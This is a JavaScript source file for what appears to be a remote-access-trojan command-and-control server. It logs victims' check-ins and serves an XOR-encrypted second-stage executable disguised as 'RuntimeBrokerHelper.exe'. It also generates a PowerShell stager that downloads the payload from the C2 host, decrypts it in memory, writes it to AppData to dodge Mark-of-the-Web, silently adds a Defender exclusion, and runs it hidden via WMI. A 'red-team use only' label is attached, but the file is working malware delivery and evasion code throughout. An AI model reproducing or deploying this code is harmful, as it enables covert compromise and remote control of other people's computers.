"use strict";

/**
 * Staged-payload infrastructure — authorised red-team use only.
 *
 * Stage 1 (stager) flow:
 *   1. Stage 1 hits GET /stage/checkin  → C2 logs the check-in, returns 200
 *   2. Stage 1 hits GET /stage/payload  → C2 serves XOR-encrypted Stage 2 binary
 *   3. Stage 1 decrypts in-memory, executes Stage 2 (full RAT stub)
 *   4. Stage 2 (full stub) connects back to C2 via normal bot channel
 *
 * Admin routes (require login):
 *   GET  /stage-monitor          → HTML dashboard showing all staging events
 *   GET  /api/stage/events       → JSON event list
 *   DELETE /api/stage/events     → clear event log
 *   GET  /api/stage/stager.ps1   → download the auto-configured PS1 stager
 */

const express      = require("express");
const fs           = require("fs");
const path         = require("path");
const { requireAdmin } = require("../middleware/auth");

const router   = express.Router();
const DL_DIR   = path.join(__dirname, "..", "downloads");
const DATA_DIR = path.join(__dirname, "..", "data");
const LOG_FILE = path.join(DATA_DIR, "stage_events.json");

// XOR key for payload encryption (8 bytes, embedded in stager too)
const XOR_KEY = Buffer.from([0x57, 0xA1, 0x3F, 0xC8, 0xB2, 0xDE, 0x94, 0x6A]);

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ── Helpers ───────────────────────────────────────────────────────────────────

function xorBuf(buf) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ XOR_KEY[i % XOR_KEY.length];
  return out;
}

function readEvents() {
  try { return JSON.parse(fs.readFileSync(LOG_FILE, "utf8")); } catch (_) { return []; }
}

function appendEvent(evt) {
  const events = readEvents();
  events.unshift(evt);
  if (events.length > 1000) events.splice(1000);
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(events, null, 2)); } catch (_) {}
}

function getIP(req) {
  return (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
}

function getPayloadBuf() {
  // Prefer the pre-configured stub in downloads/
  const configured = path.join(DL_DIR, "RuntimeBrokerHelper.exe");
  if (fs.existsSync(configured)) return fs.readFileSync(configured);
  // Fall back to raw Stub.exe
  const raw = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
  if (fs.existsSync(raw)) return fs.readFileSync(raw);
  return null;
}

// ── Stage 1 → C2: Check-in ────────────────────────────────────────────────────

router.get("/stage/checkin", (req, res) => {
  const ip   = getIP(req);
  const ua   = req.headers["user-agent"] || "-";
  const host = req.query.host || "";
  const evt  = { ts: Date.now(), type: "checkin", ip, ua, host };
  appendEvent(evt);
  console.log(`[stage] CHECKIN  ip=${ip}  host=${host || "(none)"}`);
  res.json({ ok: true, ts: evt.ts });
});

// ── Stage 1 → C2: Payload fetch ───────────────────────────────────────────────

router.get("/stage/payload", (req, res) => {
  const ip  = getIP(req);
  const ua  = req.headers["user-agent"] || "-";
  const buf = getPayloadBuf();

  if (!buf) {
    const evt = { ts: Date.now(), type: "fetch_fail", ip, ua, reason: "no_payload" };
    appendEvent(evt);
    console.warn(`[stage] FETCH_FAIL ip=${ip} — no payload ready`);
    return res.status(404).send("Stage 2 not ready. Build stub in Builder tab first.");
  }

  const encrypted = xorBuf(buf);
  const evt = { ts: Date.now(), type: "fetch", ip, ua, bytes: encrypted.length };
  appendEvent(evt);
  console.log(`[stage] FETCH  ip=${ip}  size=${encrypted.length}`);

  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Length", encrypted.length);
  res.send(encrypted);
});

// ── Admin: JSON event list ────────────────────────────────────────────────────

router.get("/api/stage/events", requireAdmin, (req, res) => {
  res.json(readEvents());
});

router.delete("/api/stage/events", requireAdmin, (req, res) => {
  try { fs.writeFileSync(LOG_FILE, "[]"); } catch (_) {}
  res.json({ ok: true });
});

// ── Admin: Download auto-configured PS1 stager ────────────────────────────────

router.get("/api/stage/stager.ps1", requireAdmin, (req, res) => {
  const c2Host = req.headers.host || "c2.osatechcloud.cloud";
  const c2Url  = `https://${c2Host}`;
  const key    = Array.from(XOR_KEY).map(b => "0x" + b.toString(16).padStart(2, "0")).join(",");

  const ps1 = `# Stage 1 Stager — Authorised Red-Team Use Only
# Auto-generated by C2 Builder  ${new Date().toISOString()}
\$ErrorActionPreference='SilentlyContinue'
\$c2='${c2Url}'
\$k=[byte[]](${key})

# Stage 1 check-in
try{(New-Object Net.WebClient).DownloadString("\$c2/stage/checkin?host=\$env:COMPUTERNAME")}catch{}

# Fetch encrypted Stage 2
\$enc=(New-Object Net.WebClient).DownloadData("\$c2/stage/payload")

# XOR decrypt in memory
for(\$i=0;\$i -lt \$enc.Length;\$i++){\$enc[\$i]=\$enc[\$i] -bxor \$k[\$i%8]}

# Write to AppData (no MOTW — written by process, not browser)
\$tp="\$env:APPDATA\\RuntimeBrokerHelper.exe"
[IO.File]::WriteAllBytes(\$tp,\$enc)

# Attempt Defender exclusion silently
try{Add-MpPreference -ExclusionPath \$tp -ErrorAction Stop}catch{}

# Execute via WMI (no suspicious parent)
try{
  ([wmiclass]'Win32_Process').Create(\$tp,\$null,\$null)|Out-Null
}catch{
  Start-Process \$tp -WindowStyle Hidden
}
`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Content-Disposition", 'attachment; filename="stager.ps1"');
  res.send(ps1);
});

